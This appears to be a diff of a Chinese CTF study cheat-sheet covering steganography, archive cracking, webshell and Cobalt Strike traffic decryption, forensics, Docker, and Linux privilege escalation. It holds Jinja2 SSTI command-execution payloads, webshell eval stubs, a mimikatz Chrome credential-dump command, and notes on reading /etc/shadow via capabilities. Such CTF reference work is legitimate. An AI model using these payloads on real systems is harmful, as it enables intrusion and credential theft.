 | <font style="color:rgb(51, 51, 51);">FLAC</font> | <font style="color:rgb(51, 51, 51);">Deepsound</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
 | <font style="color:rgb(51, 51, 51);">APE</font> | <font style="color:rgb(51, 51, 51);">Deepsound</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
-
-
-
 
 ---
 
@@ -635,7 +590,6 @@ img.show()
 | <font style="color:rgb(51, 51, 51);">RAR</font> | <font style="color:rgb(51, 51, 51);">52 61 72 21 1A 07 01 00 33 92 B5 E5 0A 01 05 0600 05 01 01 80 80 00 [0] 表示无加密 [4] 表示加密</font> |
 | <font style="color:rgb(51, 51, 51);">文件类型</font> | <font style="color:rgb(51, 51, 51);">文件16进制数据</font> |
 
-
 ### <font style="color:rgb(51, 51, 51);">crc碰撞</font>
 <font style="color:rgb(51, 51, 51);">碰撞原理：对内容进行爆破并crc32计算（整数型）</font>
 
@@ -658,7 +612,6 @@ img.show()
 | <font style="color:rgb(51, 51, 51);">明文</font> | <font style="color:rgb(51, 51, 51);">压缩包的加密方式，加密软件，CRC值相同爆破一段时间即可停止，无需爆破至结束爆破出密钥，直接保存即可解压出压缩包</font> |
 | <font style="color:rgb(51, 51, 51);">担保WinZip 恢复</font> | |
 | <font style="color:rgb(51, 51, 51);">口令来自密钥</font> | |
-
 
 ### <font style="color:rgb(51, 51, 51);">bkbrack明文参数</font>
 <font style="color:rgb(51, 51, 51);">( 可搭配archpr的明文爆破使用，并不需要完全破解，输入密钥即可）</font>
@@ -695,8 +648,6 @@ xxd 用二进制或者16进制显示内容
 ### <font style="color:rgb(51, 51, 51);">NTFS流文件隐写</font>
 <font style="color:rgb(51, 51, 51);">NtfsStreamsEditor2 360压缩查看提取</font>
 
-
-
 ---
 
 ## <font style="color:rgb(51, 51, 51);">OFFICE && 文档题总结</font>
@@ -708,7 +659,6 @@ xxd 用二进制或者16进制显示内容
 | <font style="color:rgb(51, 51, 51);">office文件</font> | <font style="color:rgb(51, 51, 51);">ctrl+A，修改文字颜色以及字体</font> |
 | <font style="color:rgb(51, 51, 51);">AOPR office文档爆破</font> | |
 | <font style="color:rgb(51, 51, 51);">oletool olevba</font> | <font style="color:rgb(51, 51, 51);">文档宏功能</font> |
-
 
 ### SNOW隐写参数
 ```plain
@@ -741,7 +691,6 @@ snow.exe -C example -p "password" output	-C 压缩
 | <font style="color:rgb(51, 51, 51);">tshark</font> | <font style="color:rgb(51, 51, 51);">分析文件信息</font> | <font style="color:rgb(51, 51, 51);">tshark -r(选定流量文件/接口) -T fields -e 提取的内容 "其他参数" tshark -r inputfile -T fields -e usbhid.data "ip.src==192.168.0.1"</font> |
 | <font style="color:rgb(51, 51, 51);">wireshark</font> | <font style="color:rgb(51, 51, 51);">流量分析</font> | |
 
-
 ### <font style="color:rgb(51, 51, 51);">流量分析命令</font>
 #### <font style="color:rgb(51, 51, 51);">tshark以及其参数</font>
 ```plain
@@ -758,31 +707,16 @@ tshark
 ###### <font style="color:rgb(119, 119, 119);">特征</font>
 <font style="color:rgb(51, 51, 51);">https-beacon通信中，cs默认使用空证书建立加密通道，流量中可以看见这一过程。</font>
 
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694520633454-1040500b-1465-424b-9269-105eeace5567.png)
-
 <font style="color:rgb(51, 51, 51);">同时在 https 协议的 Client Hello 和 Server Hello 阶段，都包含了 JA3S 值传输过程过程中会有 ja3，这个值在系统上是固定的，win10是一种的 但win11是另一种 他们取决于操作系统</font>
-
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694520677063-ff71aac6-455c-4f12-9eb2-74f101ce82f9.png)
 
 <font style="color:rgb(51, 51, 51);">http-beacon通信中，默认使用get方法向/dpixel、/__utm.gif、/pixel.gif等地址发起请求</font>
 
 <font style="color:rgb(51, 51, 51);">同时get读文件时cookie是一串base64的值，这是cs流量的元数据（后面解密会用）</font>
 
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694520750462-468f9bb5-6717-4315-92d7-1ceef38d876a.png)
-
 ###### <font style="color:rgb(119, 119, 119);">shell指令</font>
 <font style="color:rgb(51, 51, 51);">POST /submit.php?id=xxxxx</font>
 
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694520829874-1ff58831-2ba6-4962-8c24-fd2b13e8163c.png)
-
 <font style="color:rgb(51, 51, 51);">其中post一串0000的data为cs发送流量的数据 （解密时需要转成base64）</font>
-
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694520888930-2aaac6c0-80c7-4ee7-802e-1b006b260fa3.png)
 
 ###### <font style="color:rgb(119, 119, 119);">密钥文件</font>
 <font style="color:rgb(51, 51, 51);">.cobalstrike.beacon_keys 的java反序列化字节流 .ser文件</font>
@@ -792,20 +726,11 @@ tshark
 
 <font style="color:rgb(51, 51, 51);">导入java反序列化字节流文件入 parse_beacon_keys.py 得到rsa公私钥，私钥为主</font>
 
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694521163162-38223a14-0475-4cc0-a433-a9511968c894.png)
-
 [https://github.com/WBGlIl/CS_Decrypt](https://github.com/WBGlIl/CS_Decrypt)
 
 <font style="color:rgb(51, 51, 51);">将私钥和 cookie 值（cs元数据）导入 Beacon_metadata_RSA_Decrypt.py 解密出AES key 和 HMAC key</font>
 
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694521349714-14622b34-f6d3-422e-9c79-9202f99b55f3.png)
-
 <font style="color:rgb(51, 51, 51);">导入 AES key 和 HMAC key 和发送数据的base64格式入 Beacon_Task_return_AES_Decrypt.py 解密发送的数据</font>
-
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694521553479-dad76f5a-5fe0-419a-9510-f5c86a94a4ee.png)
 
 ##### <font style="color:rgb(51, 51, 51);">冰蝎流量</font>
 ###### <font style="color:rgb(119, 119, 119);">特征</font>
@@ -893,9 +818,6 @@ class C{public function __invoke($p) {eval($p."");}}
 ###### <font style="color:rgb(119, 119, 119);">解密冰蝎流量（iv用00填充）</font>
 <font style="color:rgb(51, 51, 51);">请求包和返回包（重点！iv是全0填充0000000000000000000000000000000）</font>
 
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694521853846-f3188d20-8fb2-427b-bab7-00db4aa56559.png)
-
 <font style="color:rgb(51, 51, 51);">解密的结果再进行一次base64解密即可</font>
 
 <font style="color:rgb(51, 51, 51);">python解密脚本</font>
@@ -927,30 +849,15 @@ print(plaintext)
 ###### <font style="color:rgb(119, 119, 119);">解密</font>
 <font style="color:rgb(51, 51, 51);">AES ECB解出 class文件</font>
 
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694529981164-7513de16-9bc7-43d3-b438-027d1551957e.png)
-
 <font style="color:rgb(51, 51, 51);">使用jadx进行反编译</font>
-
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694530003971-854f7a24-739e-4bab-9c9c-bc420050e30f.png)
 
 <font style="color:rgb(51, 51, 51);">再将返回值进行解密</font>
 
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694530103332-86d9f805-fcbd-40a4-a4cd-49abe9866948.png)
-
 <font style="color:rgb(51, 51, 51);">将raw值进行AES解密</font>
-
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694530124247-76f75039-714f-49af-bbd6-c6a578301efe.png)
 
 ##### <font style="color:rgb(51, 51, 51);">哥斯拉流量</font>
 ###### <font style="color:rgb(119, 119, 119);">特征</font>
 <font style="color:rgb(51, 51, 51);">命令执行的变量名/pass为webshell连接密码 </font>
-
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694522988983-54744526-cbb0-4a2f-98d5-caca66007e3b.png)
 
 ###### <font style="color:rgb(119, 119, 119);">shell命令</font>
 ```plain
@@ -990,15 +897,9 @@ if (isset($_POST[$pass])){
 ###### <font style="color:rgb(119, 119, 119);">解密</font>
 <font style="color:rgb(51, 51, 51);">base64解密后异或key，重要（其中key的第一位要移到最后一位）</font>
 
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694523258253-bec679ba-c6c2-42e2-a507-8bd1643449b0.png)
-
 ##### <font style="color:rgb(51, 51, 51);">哥斯拉流量（java）</font>
 ###### <font style="color:rgb(119, 119, 119);">解密</font>
 <font style="color:rgb(51, 51, 51);">得到16进制密文后 进行 AES ECB解密，在进行Gzip</font>
-
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694523845607-981f9251-8231-4d64-b538-6fb42a07bc2f.png)
 
 ##### <font style="color:rgb(51, 51, 51);">蚁剑/菜刀流量</font>
 <font style="color:rgb(51, 51, 51);">如果可以直接base64解码出来，则为蚁剑/菜刀流量</font>
@@ -1026,7 +927,6 @@ if (isset($_POST[$pass])){
 | <font style="color:rgb(51, 51, 51);">volitility</font> | <font style="color:rgb(51, 51, 51);">取证分析</font> | <font style="color:rgb(51, 51, 51);">volatility -f 镜像文件 文件类型info --profile=镜像配置 参数volatility -f input --profile=Win7SP1x64 pslist</font> |  |
 | <font style="color:rgb(51, 51, 51);">Registry Workshop</font> | <font style="color:rgb(51, 51, 51);">恢复注册表，注册表取证</font> | | |
 | <font style="color:rgb(51, 51, 51);">WRR</font> | <font style="color:rgb(51, 51, 51);">恢复注册表，注册表取证</font> | | |
-
 
 ### <font style="color:rgb(51, 51, 51);">内存取证 vol参数</font>
 ```plain
@@ -1195,8 +1095,6 @@ dpapi::chrome /in:\"C:\Users\fengjie\AppData\Local\Google\Chrome\User Data\Defau
 略
 ```
 
-
-
 ### <font style="color:rgb(51, 51, 51);">取证格式与工具参照表</font>
 #### <font style="color:rgb(51, 51, 51);">镜像</font>
 <font style="color:rgb(51, 51, 51);">Advanced Forensics : aff4</font>
@@ -1239,9 +1137,6 @@ dpapi::chrome /in:\"C:\Users\fengjie\AppData\Local\Google\Chrome\User Data\Defau
 | <font style="color:rgb(51, 51, 51);">E01</font> | <font style="color:rgb(51, 51, 51);">AXIOM,FTK,其它挂载工具</font> |
 | <font style="color:rgb(51, 51, 51);">Raw</font> | <font style="color:rgb(51, 51, 51);">Vol,AXIOM,R-studio,FTK</font> |
 | <font style="color:rgb(51, 51, 51);">vmdk</font> | <font style="color:rgb(51, 51, 51);">R-studio</font> |
-
-
-
 
 ## <font style="color:rgb(51, 51, 51);">docker</font>
 #### <font style="color:rgb(51, 51, 51);">帮助命令</font>
@@ -1682,7 +1577,6 @@ system('whoami') 调用以'whoami'字符串为参数的os.system()函数。
 # 0x01 利用eval()将其中字符串作为代码执行  
 {{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")}}
 
-
 {{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
 
 # 0x02 直接调用__import__()构造payload执行命令
@@ -1743,8 +1637,6 @@ __main__
 breakpoint()
 pdb()
 ```
-
-
 
 ---
 
@@ -1826,8 +1718,6 @@ getcap -r / 2>/dev/null# getcap 所有可能的capabilites文件 -r 遍历 / 根
 使用capabilites权限的命令进行修改passwd文件或者读取flag或者shadow文件
 ```
 
-
-
 ---
 
 ## <font style="color:rgb(51, 51, 51);">杂类文件类型题总结</font>
@@ -1861,11 +1751,8 @@ getcap -r / 2>/dev/null# getcap 所有可能的capabilites文件 -r 遍历 / 根
 | <font style="color:rgb(51, 51, 51);">ntds</font> | <font style="color:rgb(51, 51, 51);">渗透域</font> | <font style="color:rgb(51, 51, 51);">impacket-secretsdump</font> |
 | <font style="color:rgb(51, 51, 51);">hc</font> | <font style="color:rgb(51, 51, 51);">VareCryptTrueCrypt</font> | <font style="color:rgb(51, 51, 51);">veracrypt解密FTK挂载R-studio扫描</font> |
 
-
 ### <font style="color:rgb(51, 51, 51);">二维码类题型</font>
 #### <font style="color:rgb(51, 51, 51);">二维码组成</font>
-<!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2022/png/155952/1663935696703-3736ec0f-adb1-46a8-88a2-8f2fa1999e81.png?x-oss-process=image%2Fresize%2Cw_750%2Climit_0)
 
 #### <font style="color:rgb(51, 51, 51);">修改二维码纠错等级/掩码</font>
 <font style="color:rgb(51, 51, 51);">QrazyBox离线版</font>
